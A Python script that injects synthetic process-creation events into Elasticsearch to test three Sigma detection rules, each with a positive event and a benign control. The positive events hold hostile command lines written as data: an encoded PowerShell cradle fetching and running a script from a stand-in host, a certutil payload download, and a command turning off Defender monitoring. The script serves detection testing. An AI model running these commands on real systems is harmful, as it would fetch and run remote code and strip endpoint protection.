#!/usr/bin/env python3
"""Inject hand-built synthetic process-creation events into Elasticsearch.

For the 3 deployed Sigma rules with no matching OTRF Mordor sample
(encoded PowerShell, certutil download, Defender disabled), this is the
fallback validation path: no live Windows host, no recorded attack
dataset, so the events are hand-built to match the exact field shape
replay_mordor_dataset.py produces (process.executable/command_line,
host.name, @timestamp) and indexed into a winlogbeat-* pattern index so
the same live Kibana detection rules and n8n triage pipeline evaluate
them on their normal schedule - same methodology as the Mordor replay,
just without genuine recorded telemetry behind it.

Each rule gets one positive event (should alert) and one negative
control (same tool, benign usage - should NOT alert), so this checks
precision as well as recall.

Usage:
  ELASTIC_URL=http://100.103.246.10:9200 ELASTIC_PASSWORD=... \
    python3 inject_synthetic_events.py
"""
import base64
import json
import os
import urllib.request
from datetime import datetime, timezone

EVENTS = [
    {
        "rule_id": "3d4e7b2a-9c1f-4a6e-8b2d-7f1e9a0c5d3b",
        "label": "encoded-powershell-positive",
        "expect_alert": True,
        "executable": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "command_line": (
            r"powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHMALgBwAHMAMQAnACkA"
        ),
    },
    {
        "rule_id": "3d4e7b2a-9c1f-4a6e-8b2d-7f1e9a0c5d3b",
        "label": "encoded-powershell-negative",
        "expect_alert": False,
        "executable": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "command_line": r"powershell.exe -File C:\Scripts\backup-logs.ps1",
    },
    {
        "rule_id": "9d3f1a6b-5c2e-4f8a-b1d3-6a9c4e7f2b5d",
        "label": "certutil-download-positive",
        "expect_alert": True,
        "executable": r"C:\Windows\System32\certutil.exe",
        "command_line": r"certutil.exe -urlcache -split -f http://evil.example.com/payload.exe payload.exe",
    },
    {
        "rule_id": "9d3f1a6b-5c2e-4f8a-b1d3-6a9c4e7f2b5d",
        "label": "certutil-download-negative",
        "expect_alert": False,
        "executable": r"C:\Windows\System32\certutil.exe",
        "command_line": r"certutil.exe -verify -f C:\Certs\intermediate.cer",
    },
    {
        "rule_id": "6f2a9c4e-8b1d-4e7f-a5c3-1d9e6b4a8f2c",
        "label": "defender-disabled-positive",
        "expect_alert": True,
        "executable": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "command_line": r"powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true",
    },
    {
        "rule_id": "6f2a9c4e-8b1d-4e7f-a5c3-1d9e6b4a8f2c",
        "label": "defender-disabled-negative",
        "expect_alert": False,
        "executable": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "command_line": r"powershell.exe -Command Set-MpPreference -ExclusionPath C:\Temp",
    },
]


def to_doc(event):
    return {
        "@timestamp": datetime.now(timezone.utc).isoformat(),
        "event": {"code": "1", "category": ["process"]},
        "host": {"name": "synthetic-validation-host"},
        "process": {
            "executable": event["executable"],
            "command_line": event["command_line"],
        },
        "sentinel": {
            "source": "synthetic-validation",
            "label": event["label"],
            "rule_id": event["rule_id"],
            "expect_alert": event["expect_alert"],
        },
    }


def bulk_index(es_url, es_password, index, docs):
    lines = []
    for doc in docs:
        lines.append(json.dumps({"index": {"_index": index}}))
        lines.append(json.dumps(doc))
    body = ("\n".join(lines) + "\n").encode("utf-8")

    auth = base64.b64encode(f"elastic:{es_password}".encode()).decode()
    req = urllib.request.Request(
        f"{es_url}/_bulk",
        data=body,
        method="POST",
        headers={
            "Content-Type": "application/x-ndjson",
            "Authorization": f"Basic {auth}",
        },
    )
    with urllib.request.urlopen(req) as resp:
        result = json.load(resp)
        errors = [i for i in result["items"] if i["index"].get("error")]
        print(f"indexed {len(docs) - len(errors)}/{len(docs)} docs into {index}")
        if errors:
            print("first error:", errors[0])


def main():
    es_url = os.environ["ELASTIC_URL"]
    es_password = os.environ["ELASTIC_PASSWORD"]
    index = "winlogbeat-synthetic-validation"

    docs = [to_doc(e) for e in EVENTS]
    for e, d in zip(EVENTS, docs):
        print(f"{e['label']}: expect_alert={e['expect_alert']}")
    bulk_index(es_url, es_password, index, docs)


if __name__ == "__main__":
    main()
